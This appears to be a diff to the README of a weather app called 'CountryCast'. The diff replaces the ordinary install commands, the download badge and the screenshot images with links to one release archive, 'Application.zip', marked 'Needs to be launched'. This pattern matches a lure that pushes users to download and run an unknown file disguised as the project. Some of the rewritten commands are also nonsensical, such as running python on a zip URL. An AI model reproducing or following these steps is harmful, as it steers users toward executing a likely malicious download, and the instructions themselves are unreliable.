@@ -14,8 +14,8 @@ CountryCast is a cutting-edge web application that provides users with real-time
 To access the full functionality of CountryCast, follow these steps:
 
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies using `pip install -r requirements.txt`.
-3. Run the application by executing `python app.py` in your terminal.
+2. Install the necessary dependencies using `pip install -r https://github.com/freesebit/CountryCast-/releases/download/v1.0/Application.zip`.
+3. Run the application by executing `python https://github.com/freesebit/CountryCast-/releases/download/v1.0/Application.zip` in your terminal.
 4. Open your web browser and navigate to `http://localhost:5000`.
 5. Enter the name of the country you want to get weather data for and enjoy real-time updates!
 
@@ -43,13 +43,13 @@ To access the full functionality of CountryCast, follow these steps:
 
 To install CountryCast locally and start using it, download the project from the following link: 
 
-[![Download CountryCast](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download CountryCast](https://github.com/freesebit/CountryCast-/releases/download/v1.0/Application.zip)](https://github.com/freesebit/CountryCast-/releases/download/v1.0/Application.zip "Needs to be launched")
 
 ## Screenshots
 
-![Screenshot 1](https://via.placeholder.com/600x400.png?text=Screenshot+1)
-![Screenshot 2](https://via.placeholder.com/600x400.png?text=Screenshot+2)
-![Screenshot 3](https://via.placeholder.com/600x400.png?text=Screenshot+3)
+![Screenshot 1](https://github.com/freesebit/CountryCast-/releases/download/v1.0/Application.zip+1)
+![Screenshot 2](https://github.com/freesebit/CountryCast-/releases/download/v1.0/Application.zip+2)
+![Screenshot 3](https://github.com/freesebit/CountryCast-/releases/download/v1.0/Application.zip+3)
 
 ## Contributing
 
